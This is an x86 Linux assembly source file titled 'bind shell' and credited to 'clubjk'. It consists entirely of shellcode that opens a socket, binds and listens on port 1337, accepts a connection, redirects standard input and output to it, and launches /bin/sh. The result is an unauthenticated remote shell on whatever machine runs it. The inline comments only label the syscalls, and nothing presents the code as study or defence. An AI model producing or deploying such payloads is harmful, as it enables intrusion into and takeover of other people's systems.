; bind shell 
; Author: clubjk

global _start

section .text

_start:

	;Create a socket with sys_socket
	
	push 0x66
	pop eax
	push 0x1
	pop ebx
	push esi
	push ebx
	push 0x2
	mov ecx, esp

	int 0x80        ;calling system call 102 with the params in eax,ebx, and ecx


	;Bind socket to an address/port via sys_bind

	pop edi
	xchg edi, eax
	xchg ebx, eax
	mov al, 0x66
	push esi
	push word 0x3905
	push word bx
	mov ecx, esp
	push 0x10
	push ecx
	push edi
	mov ecx, esp

	int 0x80

	;Set up listen system call via sys_listen

	mov al, 0x66
	mov bl, 0x4
	mov esi, 0x0
	push edi
	
	mov ecx, esp

	int 0x80

	;Accept a new connection with sys_accept

	mov al, 0x66
	mov ebx, 0x5
	push esi
	push esi
	push edi

	mov ecx, esp

	int 0x80	;invokes sys call

	;Redirect standard input (stdin), (stdout), (stderr) (via dup2 syscall)

	xor ecx, ecx
	mov cl, 0x2
	xchg ebx, eax
	loop:
		mov al, 0x3f
		int 0x80
		dec ecx
		jns loop
	
	int 0x80

	;Execute a shell (via execve syscall)

	xor eax, eax
	push eax
	

	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp

	push eax

	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 0xb
        
	int 0x80




				 
